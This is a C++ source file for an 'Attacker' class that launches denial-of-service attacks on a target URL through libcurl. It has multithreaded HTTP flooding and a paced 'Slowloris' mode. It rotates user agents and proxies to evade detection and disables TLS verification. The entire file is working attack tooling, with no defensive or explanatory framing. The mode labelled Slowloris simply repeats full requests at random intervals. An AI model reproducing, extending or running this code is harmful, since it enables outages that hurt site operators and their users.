#include "attacker.h"
#include <curl/curl.h>
#include <thread>
#include <atomic>
#include <iostream>
#include <vector>
#include <random>

std::atomic<bool> Attacker::attacking(false);
std::atomic<bool> Attacker::paused(false);
std::atomic<int> Attacker::successfulRequests(0);
std::atomic<int> Attacker::failedRequests(0);

size_t writeCallback(void*, const size_t size, const size_t nmemb, void*) {
    return size * nmemb;
}

std::string Attacker::getRandomUserAgent() {
    static const std::vector<std::string> userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
    };
    static std::mt19937 rng(static_cast<unsigned>(std::chrono::system_clock::now().time_since_epoch().count()));
    std::uniform_int_distribution<size_t> dist(0, userAgents.size() - 1);
    return userAgents[dist(rng)];
}

void Attacker::httpFlood(const std::string& url, int requests, const ProxyManager& proxy) {
    CURL* curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, getRandomUserAgent().c_str());
        if (proxy.isEnabled()) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.getRandomProxy().c_str());
        }
        while (attacking && requests--) {
            if (paused) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }
            const CURLcode res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                ++successfulRequests;
                std::cout << "Sent request to " << url << std::endl;
            } else {
                ++failedRequests;
                std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(10));
        }
        curl_easy_cleanup(curl);
    }
}

void Attacker::slowloris(const std::string& url, const ProxyManager& proxy) {
    CURL* curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeCallback);
        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
        curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        curl_easy_setopt(curl, CURLOPT_USERAGENT, getRandomUserAgent().c_str());
        if (proxy.isEnabled()) {
            curl_easy_setopt(curl, CURLOPT_PROXY, proxy.getRandomProxy().c_str());
        }
        std::mt19937 rng(static_cast<unsigned>(std::chrono::system_clock::now().time_since_epoch().count()));
        std::uniform_int_distribution<int> dist(500, 2000);
        while (attacking) {
            if (paused) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }
            const CURLcode res = curl_easy_perform(curl);
            if (res == CURLE_OK) {
                ++successfulRequests;
                std::cout << "Slowloris request to " << url << std::endl;
            } else {
                ++failedRequests;
                std::cerr << "Request failed: " << curl_easy_strerror(res) << std::endl;
            }
            std::this_thread::sleep_for(std::chrono::milliseconds(dist(rng)));
        }
        curl_easy_cleanup(curl);
    }
}

void Attacker::start(const std::string& url, const std::string& type, int threads, int requests, const ProxyManager& proxy) {
    attacking = true;
    paused = false;
    successfulRequests = 0;
    failedRequests = 0;
    for (int i = 0; i < threads; ++i) {
        if (type == "HTTP Flood") {
            std::thread(httpFlood, url, requests, proxy).detach();
        } else if (type == "Slowloris") {
            std::thread(slowloris, url, proxy).detach();
        }
    }
}

void Attacker::stop() {
    attacking = false;
}

void Attacker::pause() {
    paused = !paused;
}

bool Attacker::isPaused() {
    return paused;
}

bool Attacker::isAttacking() {
    return attacking;
}

int Attacker::getSuccessfulRequests() {
    return successfulRequests.load();
}

int Attacker::getFailedRequests() {
    return failedRequests.load();
}